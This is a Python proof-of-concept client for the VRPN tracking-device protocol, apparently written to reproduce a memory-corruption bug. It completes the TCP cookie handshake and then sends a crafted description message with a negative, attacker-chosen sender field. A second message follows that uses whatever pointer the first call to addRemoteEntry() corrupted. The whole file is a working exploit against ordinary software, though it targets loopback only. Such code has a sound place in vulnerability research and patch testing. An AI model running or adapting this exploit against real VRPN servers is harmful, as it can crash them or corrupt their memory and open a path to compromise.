#!/usr/bin/env python3
"""VRPN TCP client: cookie exchange, one description message with an
attacker-chosen signed sender field, then a second benign description message.

The second message exercises any pointer/state corrupted by the first
addRemoteEntry() call (e.g. d_tcpInbuf after a negative sender aliases it).
Loopback only; no external hosts.
"""
import argparse
import socket
import struct
import time

COOKIE_SIZE = 24  # vrpn_MAGICLEN(16) + vrpn_ALIGN(8)
HEADER_LEN = 24   # 5 int32 fields (20) rounded up to vrpn_ALIGN(8)


def description(sender, index, name):
    payload = struct.pack(">i", index) + name.encode()
    payload_len = len(payload)
    ceil_len = payload_len + (-payload_len % 8)
    msg = struct.pack(">IIIIII", HEADER_LEN + payload_len, 0, 0,
                      sender & 0xFFFFFFFF, 0xFFFFFFFF, 0)
    return msg + payload + b"\0" * (ceil_len - payload_len)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sender", type=lambda x: int(x, 0), default=-3,
                    help="wire header[3] value of the first message")
    ap.add_argument("--follow-sender", type=lambda x: int(x, 0), default=4,
                    help="wire header[3] value of the second message")
    ap.add_argument("--index", type=lambda x: int(x, 0), default=4)
    ap.add_argument("--name", default="B" * 96)
    ap.add_argument("--follow-name", default="C" * 96)
    ap.add_argument("--port", type=int, default=15371)
    ap.add_argument("--gap", type=float, default=0.8)
    ap.add_argument("--hold", type=float, default=1.5)
    args = ap.parse_args()

    with socket.create_connection(("127.0.0.1", args.port), timeout=5) as s:
        cookie = s.recv(COOKIE_SIZE)
        if len(cookie) != COOKIE_SIZE:
            raise SystemExit(f"short cookie: {cookie!r}")
        s.sendall(cookie)
        time.sleep(0.2)
        first = description(args.sender, args.index, args.name)
        s.sendall(first)
        print(f"first sender={args.sender} index={args.index} len={len(first)} "
              f"name={args.name[:8]!r}")
        time.sleep(args.gap)
        follow = description(args.follow_sender, args.index, args.follow_name)
        s.sendall(follow)
        print(f"follow sender={args.follow_sender} index={args.index} "
              f"len={len(follow)} name={args.follow_name[:8]!r}")
        time.sleep(args.hold)


if __name__ == "__main__":
    main()
